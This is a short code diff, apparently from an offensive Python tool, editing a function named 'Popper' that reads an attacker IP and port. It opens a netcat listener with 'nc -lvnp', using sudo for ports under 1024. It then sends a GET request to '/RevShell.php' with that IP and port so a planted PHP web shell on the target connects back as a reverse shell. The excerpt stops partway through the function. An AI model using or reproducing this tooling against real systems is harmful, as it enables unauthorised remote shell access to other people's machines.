@@ -1,13 +1,25 @@
 import utils
 import os
 import base64
+from time import sleep
 
 import NoSense
 def Popper(details, level):
-        ip = input("LHOST:\n-> ")
+        ip = details.ip
         port = input("LPORT PORT:\n-> ")
+
+        
+        # Want NC?
         schoice = input("Want a NC listener? (1) Yes (2) No\n-> ")
-        if(schoice == "1"): os.popen("qterminal -e nc -lvnp %s" % (port))
+        if(schoice == "1"):
+            if(int(port) <= 1023):
+                print("Privileged Port, gimme root")
+                os.popen("sudo qterminal -e 'nc -lvnp %s' 2>/dev/null" % (port))
+            else:
+                os.popen("qterminal -e 'nc -lvnp %s' 2>/dev/null" % (port))
+            sleep(5)
+
+        # Choose level
         if(level == "1"):
             path = "/RevShell.php?ip=" + ip + "&port=" + port
             utils.simpleGET(details, path, "", 3)
